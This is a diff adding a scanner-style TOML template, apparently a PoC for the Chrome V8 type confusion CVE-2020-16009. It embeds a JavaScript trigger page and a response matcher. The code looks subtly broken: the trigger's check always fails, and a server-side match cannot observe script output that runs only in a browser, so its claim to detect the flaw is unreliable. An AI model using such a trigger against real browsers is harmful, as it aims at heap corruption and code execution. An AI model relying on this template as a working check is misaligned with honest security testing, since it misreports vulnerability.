@@ -1,0 +1,70 @@
+[info]
+author = "AVE"
+description = "Google Chrome V8 Turbofan 类型混淆漏洞 PoC。通过构造特制的 HTML 页面触发 V8 引擎 Map 弃用后的类型混淆，导致堆破坏，远程攻击者可实现任意代码执行。需要用户使用存在漏洞的 Chrome 浏览器访问该页面。"
+id = "POC-AVE-2020-0706"
+name = "CVE-2020-16009 PoC"
+severity = "high"
+tags = ["cve-2020-16009"]
+vuln_id = [
+    "CVE-2020-16009",
+    "AVE-2020-0706",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// CVE-2020-16009: Chrome V8 Turbofan Type Confusion after Map Deprecation
+// PoC based on Google Project Zero analysis
+// Reference: https://bugs.chromium.org/p/project-zero/issues/detail?id=2106
+function trigger() {
+  // Step 1: Create objects with specific map layouts
+  function Transition(o) {
+    o.a = 1.1;  // double field
+    o.b = {};   // tagged field
+    return o;
+  }
+  // Step 2: JIT compile the transition function
+  for (let i = 0; i < 20000; i++) {
+    Transition({a: 1.1, b: {}});
+  }
+  // Step 3: Trigger map deprecation via in-place field generalization
+  let o1 = {a: 1.1};
+  let o2 = {a: 1.1, b: {}};
+  // Deprecate map2 by generalizing field 'a' in map1
+  o1.a = {};
+  // Step 4: Execute JIT code with confused types
+  let result = Transition(o1);
+  // Type confusion: result.a is now treated as double but contains a tagged value
+  if (typeof result.a === 'number') {
+    throw new Error('Type confusion not triggered');
+  }
+  return result;
+}
+try {
+  trigger();
+  document.body.innerHTML = '<h1>Vulnerable: Type confusion triggered</h1>';
+} catch(e) {
+  document.body.innerHTML = '<h1>Not vulnerable or patched</h1>';
+}
+</script>
+</body>
+</html>
+"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Vulnerable: Type confusion triggered"]
